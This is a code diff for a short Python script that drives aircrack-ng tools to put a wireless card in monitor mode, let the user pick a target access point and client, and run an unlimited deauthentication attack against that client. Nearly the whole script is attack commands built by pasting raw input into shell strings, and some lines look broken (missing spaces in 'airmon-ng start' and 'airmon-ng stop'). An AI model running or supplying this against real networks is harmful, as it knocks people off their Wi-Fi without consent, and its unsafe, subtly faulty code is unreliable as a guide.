@@ -1,6 +1,7 @@
 #!/bin/python3
 import os
 import subprocess
+os.system("sudo airmon-ng check kill")
 os.system("iwconfig")
 interface=input("\n\nInterface?\n")
 interface=interface+"mon"
@@ -8,9 +9,10 @@ os.system("sudo airmon-ng start "+interface)
 #subprocess.run(["sudo" , "airodump-ng", interface ], timeout=1)
 os.system("sudo timeout -k 10 9s airodump-ng "+interface+" < /dev/null")
 AP_mac=input("AP MAC?\n")
+channel=input("\nTarget AP channel?")
 os.system("sudo airmon-ng start "+interface+""+channel)
 #subprocess.run(["sudo" , "airodump-ng", "--bssid", AP_mac, interface ], timeout=10)
-os.system("sudo timeout -k 3 2s airodump-ng "+AP_mac+" "+interface+" < /dev/null")
-os.system("sudo airbase-ng wlan1mon")
+os.system("sudo timeout -k 20 15s airodump-ng --bssid "+AP_mac+" "+interface+" < /dev/null")
 client_mac=input("Client Mac\n")
-os.system("sudo aireplay-ng --deauth 0 -a "+AP_mac+" -c "+client_mac+" wlan0mon --ignore-negative-one")
+os.system("sudo aireplay-ng --deauth 0 -a "+AP_mac+" -c "+client_mac+" "+interface+" --ignore-negative-one")
+os.system("sudo airmon-ng stop"+interface)
